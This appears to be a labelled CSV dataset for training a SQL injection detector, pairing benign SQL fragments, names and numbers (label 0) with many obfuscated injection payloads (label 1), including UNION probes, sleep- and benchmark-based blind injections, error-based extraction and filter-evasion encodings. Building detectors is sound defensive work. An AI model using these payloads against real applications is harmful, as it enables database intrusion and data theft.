Query,Label
"SELECT column_name ( s )  FROM tea,child",0
1%22%0C%09%29%C2%A0%C2%A0/%2A%21and%2A/8677%0B%09%3D%C2%A0%0B9054%23,1
ren,0
SELECT * FROM eight FETCH FIRST 50 PERCENT ROWS ONLY,0
orejana,0
"1'   )    )   /*!as*/prxm/*!where*/1267/*!LIKE*/1267 && 3580/*!LIKE*/( /*!select*/count  (  *  )  /*!from*/domain.domains/*!as*/t1,domain.columns/*!as*/t2,domain.tables/*!as*/t3  )  --",1
brenda,0
5.65818E+15,0
SELECT * FROM who WHERE pure BETWEEN round09/01/1996believed AND four15/31/1996build,0
"1""&&8312 LIKE dbms_pipe.receive_message( 	chr (69 )||chr (79 ) ||chr(	101)	 ||chr(		68	) ,5	 )--",1
"-7845'/*!union*//*!all*//*!select*/9574,9574,9574,9574,9574,9574#",1
17154,0
"1/**//**/)/**//**//**/union/**/all/**/select/**/null,null#",1
murad@magadan.org.pe,0
17005940q,0
1/**//**//**/)/**//**//**//**/)/**//**//**//**/aS/**/oqyo/**/WhERE/**/7995/**//**/=/**//**/7995,1
SELECT week ( s )  FROM outside SELECT pot FROM during,0
"SELECT moreID AS ID, studied AS social FROM movement",0
"1""/**/and/**/elt/**//**/(/**//**/1210/**//**/=/**//**/1210,sleep/**//**/(/**//**/5/**//**//**/)/**//**//**//**/)/**//**//**//**/and/**/""zhxm""/**//**/=/**//**/""zhxm",1
1%22/%2A%2A/where/%2A%2A/6800/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/6800/%2A%2A/procedure/%2A%2A/analyse/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/extractvalue/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/9627%2Cconcat/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/0x5c%2C/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/benchmark/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/5000000%2Cmd5/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/0x4b774c75/%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%2C1/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%23,1
"CREATE TABLE IF NOT EXISTS `zcf_submitlogs`  (  `id` int ( 6 )  unsigned NOT NULL AUTO_INCREMENT, `crmsubmitlogStatus` varchar ( 20 )  DEFAULT NULL, `crmsubmitlogDescribtion` longtext NOT NULL, `crmsubmitFormType` varchar ( 30 )  NOT NULL, PRIMARY KEY  (  id  )   )  ENGINE = InnoDB DEFAULT CHARSET = utf8",0
1 )/*!WherE*/	1929 = 1929	/*!anD*/(/*!sELEct*/*/*!FRoM*/ 	(/*!sELEct*/	(	/*!SleEp*/(	5 )		) 		 	)	fzno	 )	--,1
"(  SeLeCT count  (  *  )   FrOM rdb$fields As t1,rdb$types As t2,rdb$collations As t3,rdb$functions As t4  )",1
"SELECT * FROM being ORDER BY said ASC, coal DESC",0
1%22%0B%0B%29%0C%0C%09as%0Cbpmk%0Cwhere%0B6412%C2%A0%0C%3D%09%096412%0Bunion%0Ball%0Bselect%0Bnull%2Cnull%2Cnull%2Cnull%23,1
FROM  ( SELECT DISTINCT bend FROM village ),0
"-3270%'/**/||/**/elt/**//**/(/**//**/9404/**//**/=/**//**/3498,3498/**//**/)/**//**//**/&&/**/'%'/**//**/=/**//**/'",1
"-6587'/**//**/)/**//**//**//*!union*//**//*!all*//**//*!select*//**/6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",1
1%22/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/where/%2A%2A/2473/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/2473/%2A%2A/%26%26/%2A%2A/make_set/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/6118/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/7684%2C7684/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/--,1
08109487d,0
"select count (	*	)	 /*!from*/ all_users t1,all_users t2,all_users t3,all_users t4,all_users	t5/*!and*/	 (  (  (	'juhi' /*!like*/	'juhi",1
SELECT MIN ( wood )  AS union FROM disease,0
1' where 5455 like 5455 and sLeeP  (  5  )  --,1
"SELECT * FROM label ORDER BY rocket, particularly",0
"SELECT cheeseID AS ID, obtain AS fed FROM stay",0
SELECT * FROM complex WHERE struck = 'chosen'  OR measure = 'blood',0
SELECT * FROM star WHERE Price NOT BETWEEN 10 AND 20,0
04or2ativ1,0
SELECT ACOS ( -0.8 ) ;,0
"(/**//**/select/**/*/**/from/**//**//**/(/**//**/select/**//**/(/**//**/sleep/**//**/(/**//**/5/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**/srmq/**//**/)/**//**//**/&&/**//**//**//**/(/**//**//**//**/(/**//**//**/""%""/**//**/ LIKE /**//**/""",1
canciano,0
SELECT * FROM steam WHERE automobile = 'pen'  AND  ( electricity = 'instrument' OR ordinary = 'policeman' ),0
1%22%20%20%29%20%20/%2A%21or%2A/6793%20%20%3D%20%20%20%20%28%20/%2A%21select%2A/6793/%2A%21from%2A/pg_sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20/%2A%21and%2A/%20%20%28%20%20%22lsis%22/%2A%21like%2A/%22lsis,1
"SELECT explainID AS ID, beautiful AS eager FROM with",0
-2962%27%C2%A0%C2%A0%09%29%0B%0C%09%0C%29%C2%A0%0C%C2%A0%C2%A0%C2%A0%29%0B%0B%0Bor%091570%09%0B%3D%0B%C2%A0convert%09%C2%A0%28%0B%09int%2C%0C%C2%A0%28%0C%C2%A0select%09char%C2%A0%C2%A0%28%C2%A0%09113%0B%0C%29%0C%0B%2Bchar%0C%09%28%C2%A0%0C113%0C%09%29%C2%A0%0B%2Bchar%0B%0B%28%C2%A0%C2%A0112%09%0C%29%C2%A0%09%2Bchar%0C%0C%28%0B%09106%C2%A0%0C%29%0B%09%2Bchar%C2%A0%0B%28%09%0C113%09%09%29%0B%C2%A0%2B%09%C2%A0%28%0C%0Cselect%C2%A0%09%C2%A0%28%09%C2%A0case%0Bwhen%09%09%0C%28%0B%0C1570%0C%C2%A0%3D%C2%A0%091570%0B%0C%29%09%0B%0Bthen%0Bchar%0C%C2%A0%28%C2%A0%0949%0C%09%29%09%C2%A0%0Belse%09char%C2%A0%0B%28%0B%0B48%09%C2%A0%29%0B%09%0Cend%0C%0B%C2%A0%29%0C%0C%0B%0C%29%0B%09%0C%2Bchar%0C%C2%A0%28%09%C2%A0113%0B%0B%29%0C%C2%A0%2Bchar%0C%0B%28%09%C2%A0122%0B%C2%A0%29%0C%09%2Bchar%C2%A0%C2%A0%28%C2%A0%0B118%C2%A0%09%29%09%0B%2Bchar%C2%A0%09%28%C2%A0%C2%A0122%0C%0C%29%0B%09%2Bchar%0B%C2%A0%28%09%0B113%09%09%09%29%09%C2%A0%C2%A0%09%29%0B%C2%A0%0B%0C%0C%29%0C%C2%A0%0Cand%0B%09%0C%0B%28%0C%0C%0C%0C%28%C2%A0%0C%C2%A0%09%0C%28%C2%A0%0B%27hkjo%27%09%09%3D%09%C2%A0%27hkjo,1
1.62177E+15,0
SELECT * FROM judge WHERE rain = 'power'  OR pull = 'month',0
"seleCt * frOM users wHErE id  =  1.<@$ uNiON seleCt 1,vERSIon  (    )   -- 1",1
-7624')  or	5903LIKE ( 'qqpjq'||	(	select case5903	when 5903then1else0 endfrom rdb$database)	||'qzvzq' ) and (	 'iwab'LIKE'iwab,1
"-1591/**/WHEre3291	=  3291Union	ALLSELect 3291,3291,3291,3291,3291,3291,3291,3291,3291#",1
"1""&&row (	6237,7469	) > 	(selectcount	(*)	,concat ( 0x7171706a71, 	(select 	(	elt	(	6237= 6237,1	 )) 		)		,0x717a767a71,floor ( rand(  0	 )*2 ) 	)	x from		( select 5192union	select 3785union	select 3931unionselect 7158)	a	groupby x	)",1
SELECT dollar,0
1'  )   && 3754  =    (  SELEct upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SELEct   (  cAse WHEn   (  3754  =  3754  )   Then 1 ElsE 0 enD  )   FroM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   FroM dual  )   &&   (  'ulkq'  =  'ulkq,1
"-2548""/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**/||/**/5107/**//**/=/**//**/8049--",1
SELECT AVG ( ice ) FROM universe,0
FROM  ( SELECT DISTINCT twice FROM larger ),0
"INSERT INTO vote ( flat, trap, card, score, correctly, law )  VALUES  ( 'market', 'chose'. zero', 'within', 'gas', 'waste', 'screen' )",0
end%C2%A0and%09%0C%0C%0B%28%0B%0C%0B%C2%A0%28%0C%09%C2%A0%C2%A0%09%28%C2%A0%C2%A03673%0B%09%3D%09%C2%A03673,1
SELECT * FROM least 3 SELECT * FROM love,0
nogueira de ramun,0
cholgua,0
hoeflich@movil-google.cx,0
SELECT stepped FROM necessary UNION ALL SELECT suppose FROM start ORDER BY lead,0
1%22%20%20%20%29%20%20%20%20%29%20%20%20/%2A%21or%2A/%20%20%28%20/%2A%21select%2A/2%2A%20%20%28%20%20if%20%20%20%28%20%20%20%20%28%20%20/%2A%21select%2A/%2A/%2A%21from%2A/%20%20%28%20/%2A%21select%2A/concat%20%20%28%20%200x7171706a71%2C%20%20%28%20/%2A%21select%2A/%20%20%28%20%20elt%20%20%28%20%208113%20%20%3D%20%208113%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2C0x78%20%20%20%29%20%20%20%20%29%20%20%20s%20%20%29%20%20%2C%208446744073709551610%2C%208446744073709551610%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20/%2A%21and%2A/%20%20%20%28%20%20%20%20%28%20%20%20%22nobt%22%20%20%3D%20%20%22nobt,1
SELECT * FROM grew FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM weigh,0
sempronia,0
"1'/**//*!in*/ boolean mode )/*!or*/	updatexml	 ( 1808,concat (0x2e,0x7171706a71,	 ( /*!select*/	(elt	 (1808=		1808,1			)	 )	  ),0x717a767a71 ) ,8666	) #",1
"c/ aulencia, 84",0
"1""/**/aNd/**/7756/**/lIkE/**/dbms_utility.sqlid_to_sqlhash/**//**//**/(/**//**//**//**/(/**//**//**/chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/112/**//**/)/**//**/||chr/**//**/(/**//**/106/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||/**//**/(/**//**/SELECT/**//**//**/(/**//**/cASE/**/wHeN/**//**//**/(/**//**/7756/**/lIkE/**/7756/**//**/)/**//**//**/thEN/**/1/**/ELsE/**/0/**/EnD/**//**/)/**//**//**/From/**/dual/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/122/**//**/)/**//**/||chr/**//**/(/**//**/118/**//**/)/**//**/||chr/**//**/(/**//**/122/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**/aNd/**/""jgcv""/**/lIkE/**/""jgcv",1
1'|| (	 SeLEct 'znba'whErE	8323	=8323,1
wambsgan,0
SELECT COUNT ( DISTINCT visit )  FROM prove,0
ornela,0
1%27%0Cwhere%0C9994%0B%C2%A0%3D%0B%0B9994%C2%A0and%0C9660%09%0B%3D%0C%0C%09%09%28%0B%C2%A0select%09count%0B%0C%28%C2%A0%0C%2A%C2%A0%0C%29%C2%A0%0B%0Bfrom%0Call_users%C2%A0t1%2Call_users%09t2%2Call_users%09t3%2Call_users%09t4%2Call_users%0Bt5%C2%A0%C2%A0%29%C2%A0%09--,1
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20char%20%20%28%20%20111%20%20%29%20%20%7C%7Cchar%20%20%28%20%2077%20%20%29%20%20%7C%7Cchar%20%20%28%20%20121%20%20%29%20%20%7C%7Cchar%20%20%28%20%2088%20%20%29%20LIKE%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20left%20%20%28%20%20crypt_key%20%20%28%20%20char%20%20%28%20%2065%20%20%29%20%20%7C%7Cchar%20%20%28%20%2069%20%20%29%20%20%7C%7Cchar%20%20%28%20%2083%20%20%29%20%20%2Cnull%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27tvar%27%20LIKE%20%27tvar,1
"1%'  )  /*!OR*//*!ChaR*/ (  119  )  ||/*!ChaR*/ (  100  )  ||/*!ChaR*/ (  99  )  ||/*!ChaR*/ (  121  )    =  regexp_substring  (  repeat  ( /*!rIGHt*/ ( /*!ChaR*/ (  1441  )  ,0  )  ,5000000000  )  ,/*!nuLl*/ )  --",1
8.83352E+15,0
SELECT * FROM college WHERE thing = 'lake'  AND City = 'spider',0
esbarar,0
"1%' 	)	)	 /*!and*/4241/*!LIKE*//*!convert*/ (	int,  (		/*!select*/ /*!char*/	(	113)	 +/*!char*/ ( 113) +/*!char*/  ( 112  )	+/*!char*/	 ( 106 )	 +/*!char*/(	113 )	+ 	( /*!select*/ 	( /*!case*//*!when*/	(		4241 /*!LIKE*/4241)  /*!then*/	/*!char*/ ( 49)  /*!else*//*!char*/  (48)	/*!end*/)  	) +/*!char*/	(113	)		+/*!char*/  (		122)+/*!char*/ (	118 	) 	+/*!char*/ ( 122  ) 	+/*!char*/ (  113		 ) 	)		  ) 	/*!and*/		 (	('%'	/*!LIKE*/	'",1
1%25%27/%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/and/%2A%2A/4386/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/utl_inaddr.get_host_address/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/chr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/113/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/113/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/112/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/106/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/113/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7C/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/select/%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/case/%2A%2A/when/%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/4386/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/4386/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/then/%2A%2A/1/%2A%2A/else/%2A%2A/0/%2A%2A/end/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/from/%2A%2A/dual/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/113/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/122/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/118/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/122/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A/%7C%7Cchr/%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/113/%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A//%2A%2A/and/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A//%2A%2A//%2A%2A//%2A%2A/%28/%2A%2A//%2A%2A/%27%25%27/%2A%2A//%2A%2A/%3D/%2A%2A//%2A%2A/%27,1
"select */*!from*/generate_series	 ( 1134,1134,/*!case*//*!when*/  (	1134=  4909)/*!then*/1/*!else*/0/*!end*/)	/*!limit*/1--",1
yasna,0
SELECT AVG ( Price ) FROM available,0
1%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20and%203754%20%20%3D%20%20%20%20%28%20%20select%20upper%20%20%28%20%20xmltype%20%20%28%20%20chr%20%20%28%20%2060%20%20%29%20%20%7C%7Cchr%20%20%28%20%2058%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%203754%20%20%3D%20%203754%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%2062%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20from%20dual%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22%25%22%20%20%3D%20%20%22,1
86943454g,0
"1""/*!where*/6686/**//**/=/**//**/6686/*!or*/elt/**//**/(/**//**/6272/**//**/=/**//**/6272,/*!sleep*//**/(/**//**/5/**//**//**/)/**//**//**//**/)/**//**//**/--",1
SELECT CURRENT_TIMESTAMP (  )  + 1;,0
select/**//**//**/(/**//**//*!case*//**//*!when*//**//**//**/(/**//**/6179/**//**/ LIKE /**//**/8476/**//**/)/**//**//**//*!then*//**/6179/**//*!else*//**//*!cast*//**//**/(/**//**/1/**//*!as*//**/int/**//**/)/**//**///**//**/(/**//**//*!select*//**/0/**//*!from*//**/dual/**//**/)/**//**//**//*!end*//**//**/)/**//**//**//*!from*//**/dual--,1
44923287d,0
philipp.castella@biopoint.vc,0
46793939w,0
1'+  ( /*!SeleCt*/ukwc/*!WhERe*/3008  =  3008/*!Or*/  ( /*!SeleCt*/*/*!fRoM*/  ( /*!SeleCt*/ ( /*!Sleep*/ (  5   )    )     )  sddo  )  #,1
blancafort,0
SELECT * FROM shout WHERE means = 'eye'  OR sad = 'win',0
"SELECT islandID AS ID, skin AS because FROM thousand",0
pascuet landivar,0
"1'||	(  select'mwmn'where5112	LIKE	5112or( select	9173	from	( select count (*	)	,concat(0x7171706a71,	( select			( elt	( 9173LIKE9173,1	)	)) ,0x717a767a71,floor (  rand(0 )	*2		)) xfrominformation_schema.character_setsgroup	by x) a	) 	) ||'",1
SELECT TOP 3 * FROM finest WHERE bread = 'secret',0
SELECT * FROM what WHERE by = 'quarter',0
us,0
SELECT edge,0
"select/**/sleep/**//**/(/**//**/5/**//**/)/**//**//**/&&/**//**//**/(/**//**/""%""/**/LIKE/**/""",1
"-3368'/**//**//**/)/**//**//**//**/)/**//**//**//**/unION/**/all/**/SeleCT/**/4913,4913,4913,4913,4913,4913,4913,4913,4913--",1
-8026%20%7C%7C%20elt%20%20%28%20%208434%20%20%3D%20%204516%2C4516%20%20%29%20%20%23%20bsqo,1
56,0
DELETE FROM somehow WHERE factor = 'fruit',0
"1   )    )   /*!aS*/jfae/*!WHerE*/6684/*!liKE*/6684/*!and*/2716/*!liKE*/( /*!SELeCt*/count  (  *  )  /*!FROM*/sysusers/*!aS*/sys1,sysusers/*!aS*/sys2,sysusers/*!aS*/sys3,sysusers/*!aS*/sys4,sysusers/*!aS*/sys5,sysusers/*!aS*/sys6,sysusers/*!aS*/sys7  )  --",1
SELECT afternoon,0
1%20where%207196%20%20%3D%20%207196%20%7C%7C%208466%20%20%3D%20%20benchmark%20%20%28%20%205000000%2Cmd5%20%20%28%20%200x694a4745%20%20%20%29%20%20%20%20%29%20%20%20--,1
basilisa,0
SELECT COUNT ( DISTINCT yes )  FROM guide,0
SELECT * FROM bend  WHERE own NOT LIKE '[needle]%',0
SELECT * FROM with WHERE depth = 'wore'  OR feel = 'red',0
"SELECT Employees.affect, COUNT ( Orders.coldID )  AS jarFROM    ( OrdersINNER JOIN amount ON Orders.symbolID  =  Employees.silkID )",0
SELECT COUNT ( spoken )  FROM explanation,0
"logroo, 98, 5-d",0
"-7776'/**//**/)/**//**//**//*!OR*//**/5023/**//**/=/**//**/ctxsys.drithsx.sn/**//**/(/**//**/5023,/**//**/(/**//**/chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/112/**//**/)/**//**/||chr/**//**/(/**//**/106/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||/**//**/(/**//**//*!seLECt*//**//**//**/(/**//**//*!cAse*//**//*!wHEn*//**//**//**/(/**//**/5023/**//**/=/**//**/5023/**//**/)/**//**//**//*!theN*//**/1/**//*!else*//**/0/**//*!End*//**//**/)/**//**//**//*!FROM*//**/dual/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**/)/**//**/||chr/**//**/(/**//**/122/**//**/)/**//**/||chr/**//**/(/**//**/118/**//**/)/**//**/||chr/**//**/(/**//**/122/**//**/)/**//**/||chr/**//**/(/**//**/113/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**//*!aND*//**//**//**/(/**//**/'ihof'/**//**/=/**//**/'ihof",1
select/**//**//**/(/**//**//*!case*//**//*!when*//**//**//**/(/**//**/5423/**//**/=/**//**/7706/**//**/)/**//**//**//*!then*//**/5423/**//*!else*//**//*!cast*//**//**/(/**//**/1/**//*!as*//**/int/**//**/)/**//**///**//**/(/**//**//*!select*//**/0/**//*!from*//**/dual/**//**/)/**//**//**//*!end*//**//**/)/**//**//**//*!from*//**/dual--,1
"UPDATE very SET anywhere =  'pressure', City =  'couple' WHERE pay =  but",0
SELECT TOP 3 * FROM suit WHERE seen = 'land' SELECT * FROM such,0
retiendas,0
alobras,0
28530,0
ull colmenares,0
SELECT AVG ( raise )  FROM declared  SELECT SUM ( tongue ),0
"1'/**/	 ) 	) 		asnlfqwhere3410/**/LIKE/**/3410 or	extractvalue  ( 1297,concat(	0x5c,0x7171706a71, (  select			(		elt	( 1297/**/LIKE/**/1297,1		)  ) 	),0x717a767a71 	)		) 	--",1
"madrid, 27",0
"-5360'/*!where*/8178/**//**/=/**//**/8178/*!union*//*!all*//*!select*/8178,8178,8178--",1
cerpa oitavn,0
SELECT * FROM port WHERE Price NOT BETWEEN 10 AND 20,0
marcos esculta,0
1%22/%2A%2A//%2A%2A/%29/%2A%2A//%2A%2A//%2A%2A/union/%2A%2A/all/%2A%2A/select/%2A%2A/null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,1
SELECT TOP 3 * FROM greatest WHERE western = 'brave' SELECT * FROM record,0
1'   )    )     )   unIOn AlL SELeCT nulL#,1
"SELECT duck, nearby+ ', ' + quiet+ ' ' + wing+ ', ' + vessels AS engineer  FROM wherever",0
"1%' || Char  (  68  )  ||Char  (  69  )  ||Char  (  97  )  ||Char  (  85  )    =  regexp_substring  (  repeat  (  RIGHt  (  Char  (  5389  )  ,0  )  ,5000000000  )  ,nulL  )   && '%'  =  '",1
SELECT * FROM rather 3 SELECT * FROM prove,0
SELECT * FROM harbor FETCH FIRST 50 PERCENT ROWS ONLY,0
%22%5E%22,1
-2316%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20%7C%7C%208519%20LIKE%206010,1
SELECT AVG ( aware ) FROM ship,0
SELECT * FROM garden WHERE bear NOT LIKE '[hill]%',0
SELECT AVG ( Price ) FROM sail,0
"SELECT Employees.sugar, COUNT ( Orders.secretID )  AS situationFROM    ( OrdersINNER JOIN thrown ON Orders.morningID  =  Employees.butID )",0
oR%20%27%27%20%27,1
1%C2%A0/%2A%21where%2A/%093744%C2%A0%09%3D%0C%0B3744,1
SELECT * FROM business WHERE shelter NOT LIKE 'feathers%',0
-4925%22%20union%20all%20select%205686%2C5686%2C5686%2C5686%2C5686%2C5686%2C5686%23,1
SELECT * FROM did WHERE body = 'pound'  AND  ( pour = 'original' OR tank = 'course' ),0
elda,0
SELECT * FROM practical  WHERE every NOT LIKE '[calm]%',0
"SElEcT count  (  *  )  /*!FroM*/all_users t1,all_users t2,all_users t3,all_users t4,all_users t5/*!AnD*/   (    (     (  ""ymss"" LIKE ""ymss",1
-8369/**//**/)/**//**//**/where/**/7234/**//**/ LIKE /**//**/7234/**/order/**/by/**/1--,1
1'		)		)  		aSsjzf	wHEre	9997= 	9997ANd	4193=5408,1
SELECT * FROM automobile WHERE getting = 'move'  OR development = 'paid',0
"SELECT direction,engine FROM kitchen WHERE want = 'yes' UNION SELECT shut, even FROM behavior",0
SELECT DISTINCT darkness FROM lovely,0
SELECT MIN ( carefully )  AS dull FROM remarkable,0
64526656h,0
SELECT COUNT ( red )  FROM at,0
"select*/*!from*/users/*!where*/id/*!LIKE*/11<1#/*!union*//*!select*/1,/*!version*/ (  )		--1",1
1%27%20%20%29%20%20%20as%20fxid%20where%205926%20%20%3D%20%205926,1
"1""   )    )   /*!and*//*!char*/ (  111  )  ||/*!char*/ (  77  )  ||/*!char*/ (  121  )  ||/*!char*/ (  88  ) LIKE regexp_substring  (  repeat  ( /*!left*/ (  crypt_key  ( /*!char*/ (  65  )  ||/*!char*/ (  69  )  ||/*!char*/ (  83  )  ,/*!null*/ )  ,0  )  ,500000000  )  ,/*!null*/ )  /*!and*/   (    (   ""vcjt""/*!like*/""vcjt",1
6432,0
"SELECT column_name ( s )  FROM realize,needed",0
woolgar@awat.gov,0
SELECT * FROM rhyme WHERE slipped = 'lucky' FETCH FIRST 3 ROWS ONLY,0
"1 and 8514 LIKE ( selectcount ( 	*	) 	fromdomain.domains ast1,domain.columns as	t2,domain.tables ast3	) #miji",1
"1"" ) 	where 9545 LIKE 9545	and 9198 LIKE 9198--",1
SELECT safety FROM grow UNION SELECT tales FROM deal ORDER BY thank,0
buitrago pontigo,0
jabbari,0
"1""rlike	SLeEP 	(5 )",1
SELECT * FROM prove,0
dotan,0
-5286'/*!or*/6783/**/ =	1233,1
